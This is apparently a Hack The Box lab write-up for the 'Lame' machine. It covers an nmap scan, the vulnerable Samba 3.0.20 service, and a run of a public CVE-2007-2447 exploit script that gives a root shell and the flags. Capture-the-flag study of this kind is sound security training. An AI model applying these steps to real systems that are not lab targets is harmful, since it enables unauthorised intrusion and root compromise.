# Lame – Hack The Box
![Status](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OSCP](https://img.shields.io/badge/OSCP-Recommended-blue)
![Linux](https://img.shields.io/badge/Target-Linux-yellow)

---

## 🧩 Overview
Lame is a classic entry-level Hack The Box Linux machine focused on basic service enumeration and exploitation of known vulnerabilities in Samba and DistCC. This box mirrors common OSCP-style fundamentals: scanning, service identification, and leveraging public exploits.

---

## 🔍 Enumeration

```bash
nmap -sCV -p- -oN nmap_lame.txt 10.10.10.3
```

Key findings:
- **Port 21** – FTP (vsftpd 2.3.4)
- **Port 22** – SSH
- **Port 139/445** – Samba smbd 3.0.20
- **Port 3632** – distccd

Samba version is **vulnerable to a remote code execution exploit (CVE-2007-2447).**

---

## 🎯 Exploitation – Samba (CVE-2007-2447)

```bash
python3 37170.py 10.10.10.3 445
```

This provides a remote root shell due to command injection in the `username` field.

---

## 🔼 Privilege Escalation
The Samba exploit drops us directly into a root shell.

```bash
id
whoami
cat /root/root.txt
```

---

## 🏆 Flags

```bash
cat /root/root.txt
cat /home/makis/user.txt
```

---

## 📌 Lessons Learned
- Samba 3.0.20 is instantly recognizable as vulnerable.
- Public exploits often give immediate root access.
- Always verify service versions during enumeration.
